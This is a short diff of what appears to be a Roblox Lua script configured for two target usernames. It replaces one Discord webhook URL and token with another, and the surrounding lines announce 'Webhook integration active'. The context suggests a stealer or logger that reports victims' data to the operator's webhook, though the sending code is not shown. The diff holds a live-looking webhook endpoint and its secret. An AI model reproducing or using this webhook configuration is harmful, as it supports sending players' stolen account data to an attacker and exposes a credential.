@@ -2,7 +2,7 @@
 -- Configured for usernames: Cmbath, Stealeryarn67
 -- Webhook integration active
 
-local webhook = "https://discord.com/api/webhooks/1571040073707954326/OddAngQZmvXMKcN4tsTZjMBkzz-6tcvlKVoV8sUcBbZcGGBbOdjhtjG12YbvltnnEg0E"
+local webhook = "https://discord.com/api/webhooks/1571172567086145566/uo__wCzTrsDFjbrbDTIM6SiLDTiRIZ-YSLTs76VtXTCyNi8gEkBghexXeLUktVA_w9f1"
 local targetUsers = {["cmbath"] = true, ["stealeryarn67"] = true}
 
 if not game:IsLoaded() then
